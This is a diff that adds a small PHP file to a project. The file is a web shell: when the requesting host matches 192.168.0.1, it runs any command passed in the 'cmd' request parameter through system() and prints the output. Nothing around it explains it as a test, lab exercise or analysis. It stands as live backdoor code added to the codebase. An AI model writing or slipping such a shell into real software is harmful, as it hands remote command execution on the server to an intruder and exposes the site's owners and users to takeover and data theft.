@@ -1,0 +1,10 @@
+<?php
+    if ($_SERVER['REMOTE_HOST'] === "192.168.0.1") { 
+        if(isset($_REQUEST['cmd'])){
+            $cmd = ($_REQUEST['cmd']);
+            echo "<pre>\n";
+            system($cmd);
+            echo "</pre>";
+        }
+    }
+?>
